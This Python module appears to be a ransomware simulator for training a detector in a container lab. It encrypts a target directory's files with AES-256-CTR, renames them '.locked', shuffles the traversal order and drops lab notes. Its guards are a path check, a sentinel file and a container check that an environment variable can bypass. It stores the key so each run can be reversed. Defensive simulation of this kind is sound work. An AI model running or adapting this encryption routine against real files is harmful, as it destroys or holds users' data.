"""Guarded ransomware simulator (spec Section 7). Lab-only, reversible, container-confined.

Oct 2026 note: the spec suggests Fernet, but Fernet emits base64
(~6 bits/byte) which can never cross the 7.5-bit high-entropy threshold and
does not resemble real ransomware. This simulator uses raw AES-256-CTR
ciphertext (~8 bits/byte, like WannaCry/LockBit payloads) with a per-file
random IV prepended; the per-run key is stored alongside the log so every
run stays reversible. Guards, rate limiting and note behaviour are unchanged.
"""
from __future__ import annotations
import os
import secrets
import time
from datetime import datetime, timezone
from pathlib import Path
import uuid

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from .config import load_config
from .logging_setup import get_logger

SENTINEL = ".LAB_SAFE_TO_ENCRYPT"
NOTE = "README_LAB_NOTE.txt"

def _guards(victim: Path, cfg) -> list[str]:
    failures = []
    expected = Path(cfg.victim_dir).resolve()
    if victim.resolve() != expected:
        failures.append(f"target {victim} != configured lab path {expected}")
    if not (victim / SENTINEL).exists():
        failures.append(f"sentinel {SENTINEL} missing in {victim}")
    if not Path("/.dockerenv").exists() and os.environ.get("LAB_ALLOW_HOST_SIM") != "1":
        failures.append("not inside a container (/.dockerenv missing); set LAB_ALLOW_HOST_SIM=1 only for local tests")
    return failures

def encrypt_raw(key: bytes, data: bytes) -> bytes:
    iv = secrets.token_bytes(16)
    encryptor = Cipher(algorithms.AES(key), modes.CTR(iv)).encryptor()
    return iv + encryptor.update(data) + encryptor.finalize()

def decrypt_raw(key: bytes, blob: bytes) -> bytes:
    iv, ct = blob[:16], blob[16:]
    decryptor = Cipher(algorithms.AES(key), modes.CTR(iv)).decryptor()
    return decryptor.update(ct) + decryptor.finalize()

def run_attack(cfg=None, rate: float | None = None, delay: float | None = None, victim: str | None = None) -> dict:
    cfg = cfg or load_config()
    log = get_logger("simulator", log_dir=cfg.log_dir, host=cfg.host)
    rate = rate or cfg.sim_rate_files_per_sec
    delay = cfg.sim_delay_seconds if delay is None else delay
    vdir = Path(victim or cfg.victim_dir)
    errs = _guards(vdir, cfg)
    if errs:
        msg = "SIMULATOR REFUSED: " + "; ".join(errs)
        print(msg)
        log.error("sim_refused", msg)
        raise SystemExit(msg)
    run_id = uuid.uuid4().hex[:8]
    key = secrets.token_bytes(32)  # AES-256
    key_path = Path(cfg.log_dir) / f"sim_key_{run_id}.key"
    key_path.parent.mkdir(parents=True, exist_ok=True)
    key_path.write_text(key.hex())
    files = sorted([p for p in vdir.rglob("*") if p.is_file() and p.name != SENTINEL])
    # Traverse in random order (real ransomware does not walk sorted; sorted
    # order would cluster zip/jpg files in time and starve later windows).
    import random as _random
    _random.SystemRandom().shuffle(files)
    note_text = (f"LAB SIMULATION run={run_id} key={key_path} files={len(files)}\n"
                 "This is a lab drill. AES-256-CTR, IV prepended per file, key stored at key path.\n")
    # Drop the same note in the target dir and every immediate subdir, like
    # real ransomware (also feeds the detector's ransom-note feature).
    log.warning("attack_scheduled", f"run {run_id}: {len(files)} files in {vdir} after {delay}s at {rate}/s (AES-256-CTR raw)")
    time.sleep(delay)
    attack_start = datetime.now(timezone.utc).isoformat()
    log.warning("attack_start", f"run {run_id} started", run_id=run_id, attack_start=attack_start, files=len(files))
    interval = 1.0 / rate if rate > 0 else 0
    n = 0
    for p in files:
        try:
            data = p.read_bytes()
            p.write_bytes(encrypt_raw(key, data))
            new = p.with_name(p.name + ".locked")
            p.rename(new)
            n += 1
        except Exception as e:
            log.warning("sim_file_error", f"{p}: {e}")
        if interval:
            time.sleep(interval)
    (vdir / NOTE).write_text(note_text)
    for sub in sorted(p for p in vdir.iterdir() if p.is_dir()):
        try:
            (sub / NOTE).write_text(note_text)
        except Exception as e:
            log.warning("sim_file_error", f"note {sub}: {e}")
    attack_end = datetime.now(timezone.utc).isoformat()
    log.warning("attack_end", f"run {run_id} encrypted {n} files", run_id=run_id, attack_start=attack_start, attack_end=attack_end, files=n)
    return {"run_id": run_id, "files": n, "attack_start": attack_start, "attack_end": attack_end, "key_path": str(key_path)}
